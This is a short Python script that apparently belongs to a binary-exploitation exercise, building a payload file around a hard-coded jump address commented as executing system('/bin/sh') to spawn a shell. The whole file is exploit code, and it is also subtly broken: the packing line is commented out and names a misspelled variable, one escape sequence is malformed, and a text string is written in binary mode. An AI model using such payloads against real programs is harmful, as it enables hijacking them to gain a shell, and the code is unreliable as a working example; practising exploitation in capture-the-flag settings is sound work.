import struct

address_jmp = 0x0400a85  # Address that will execute `system("/bin/sh")`

payload = ""
# payload += struct.pack('<I', address_jump)

payload += '\x0a'
payload += '1234\0xa'

with open('payload', 'wb') as f:
    f.write(payload)
